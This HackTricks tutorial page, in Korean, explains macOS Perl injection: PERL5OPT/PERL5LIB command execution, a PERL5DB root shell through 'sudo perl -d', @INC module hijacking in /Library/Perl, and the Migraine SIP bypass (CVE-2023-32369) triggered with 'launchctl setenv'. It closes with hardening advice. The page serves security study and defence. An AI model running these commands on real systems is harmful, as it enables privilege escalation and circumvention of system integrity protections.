# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PERL5OPT` 및 `PERL5LIB` env variable 사용

env variable **`PERL5OPT`**를 사용하면 인터프리터가 시작될 때 **Perl**이 arbitrary commands를 실행하도록 만들 수 있습니다(대상 script의 첫 번째 줄이 parse되기 전에도 가능).
예를 들어, 다음 script를 생성합니다:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
이제 **env variable을 export**하고 **perl** script를 실행합니다:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
또 다른 옵션은 Perl module(예: `/tmp/pmod.pm`)을 생성하는 것입니다:
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
그런 다음 환경 변수를 사용하여 모듈이 자동으로 검색되고 로드되도록 합니다:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### 기타 흥미로운 environment variables

* **`PERL5DB`** – interpreter가 **`-d`** (debugger) flag와 함께 시작되면, `PERL5DB`의 content가 debugger context *내부에서* Perl code로 실행됩니다.
privileged Perl process의 environment **및** command-line flags를 모두 제어할 수 있다면 다음과 같이 할 수 있습니다:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

* **`PERL5SHELL`** – Windows에서 이 variable은 Perl이 shell을 spawn해야 할 때 사용할 shell executable을 제어합니다. macOS에서는 관련이 없으므로 여기서는 completeness를 위해서만 언급합니다.

`PERL5DB`에는 `-d` switch가 필요하지만, verbose troubleshooting을 위해 이 flag가 활성화된 상태로 *root* 권한으로 실행되는 maintenance 또는 installer script를 흔히 찾을 수 있으므로, 이 variable은 유효한 escalation vector입니다.

## dependencies를 통한 방식 (`@INC` abuse)

Perl이 검색할 include path (**`@INC`**)를 다음과 같이 확인할 수 있습니다:
```bash
perl -e 'print join("\n", @INC)'
```
macOS 13/14에서 일반적으로 출력되는 결과는 다음과 같습니다:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
일부 반환된 폴더는 실제로 존재하지도 않지만, **`/Library/Perl/5.30`**은 존재하며 SIP로 보호되지 않고 SIP로 보호되는 폴더보다 앞에 있습니다. 따라서 *root* 권한으로 쓸 수 있다면 악성 module(예: `File/Basename.pm`)을 배치하여 해당 module을 import하는 모든 privileged script에서 이를 *우선적으로* 로드하도록 만들 수 있습니다.

> [!WARNING]
> `/Library/Perl` 내부에 쓰려면 여전히 **root** 권한이 필요하며, macOS는 쓰기 작업을 수행하는 process에 *Full Disk Access* 권한을 요청하는 **TCC** prompt를 표시합니다.

예를 들어 script가 **`use File::Basename;`**을 import하는 경우, 공격자가 제어하는 code를 포함한 `/Library/Perl/5.30/File/Basename.pm`을 생성할 수 있습니다.

## Migration Assistant를 통한 SIP bypass (CVE-2023-32369 “Migraine”)

2023년 5월 Microsoft는 **CVE-2023-32369**(별칭 **Migraine**)를 공개했습니다. 이는 *root* attacker가 System Integrity Protection(SIP)을 완전히 **bypass**할 수 있도록 하는 post-exploitation technique입니다.  
취약한 component는 **`systemmigrationd`**이며, **`com.apple.rootless.install.heritable`** entitlement가 부여된 daemon입니다. 이 daemon이 spawn하는 모든 child process는 해당 entitlement를 상속하므로 SIP restrictions를 **벗어난** 상태로 실행됩니다.<sup>[[1]](#references)</sup>

researcher들이 식별한 child 중에는 Apple-signed interpreter도 포함되어 있습니다.<sup>[[1]](#references)</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Perl은 `PERL5OPT`를 따르고(Bash는 `BASH_ENV`를 따름) 있으므로, daemon의 *environment*를 poisoning하는 것만으로도 SIP가 없는 context에서 임의 코드 실행 권한을 얻을 수 있습니다:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
`migrateLocalKDC`가 실행되면, `/usr/bin/perl`이 악성 `PERL5OPT`로 시작하여 *SIP가 다시 활성화되기 전에* `/private/tmp/migraine.sh`를 실행합니다. 해당 스크립트를 통해 예를 들어 **`/System/Library/LaunchDaemons`** 내부에 payload를 복사하거나, `com.apple.rootless` extended attribute를 할당하여 파일을 **삭제할 수 없게** 만들 수 있습니다.

Apple은 **Ventura 13.4**, **Monterey 12.6.6** 및 **Big Sur 11.7.7**에서 이 문제를 수정했지만, 이전 버전 또는 패치되지 않은 시스템은 여전히 exploit될 수 있습니다.<sup>[[1]](#references)</sup>

## Hardening 권고 사항

1. **위험한 변수 제거** – privileged launchdaemons 또는 cron jobs는 깨끗한 환경에서 시작해야 합니다(`launchctl unsetenv PERL5OPT`, `env -i` 등).
2. **필요한 경우가 아니라면 interpreter를 root로 실행하지 않기** – compiled binary를 사용하거나 일찍 privileges를 낮춥니다.
3. **vendor script에 `-T`(taint mode) 사용** – taint checking이 활성화되면 Perl이 `PERL5OPT` 및 기타 안전하지 않은 switch를 무시합니다.
4. **macOS를 최신 상태로 유지** – “Migraine”은 현재 release에서 완전히 patch되었습니다.

## References

- [1] [Microsoft Security Blog – New macOS vulnerability, Migraine, could bypass System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
